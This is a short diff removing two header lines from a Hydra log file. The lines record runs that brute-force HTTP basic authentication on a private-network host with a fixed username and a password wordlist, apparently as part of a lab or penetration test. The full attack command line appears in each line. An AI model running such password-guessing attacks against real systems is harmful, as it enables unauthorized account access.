@@ -1,2 +1,0 @@
-# Hydra v9.5 run at 2025-09-10 16:00:29 on 192.168.100.103 http-get (hydra -I -V -f -l wangxx -P rockyou8.txt -t 1 -w 3 -o evidence/basic_rockyou8_results.txt 192.168.100.103 http-get /basicauth)
-# Hydra v9.5 run at 2025-09-10 16:01:29 on 192.168.100.103 http-get (hydra -I -V -f -l wangxx -P rockyou8.txt -t 1 -w 3 -o evidence/basic_rockyou8_results.txt 192.168.100.103 http-get /basicauth)
